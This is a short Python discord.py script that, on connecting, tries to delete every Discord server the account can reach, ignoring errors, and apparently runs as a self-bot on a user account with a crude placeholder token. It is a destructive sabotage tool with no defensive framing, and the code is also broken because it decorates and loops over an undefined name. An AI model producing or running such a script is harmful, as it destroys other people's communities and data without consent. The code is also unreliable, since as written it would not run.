import discord

bot = discord.Client()

@client.event
async def on_connect():
  for guild in client.guilds:
    try:
      await guild.delete()
    except:
      pass

bot.run('urgaytoken', bot=False)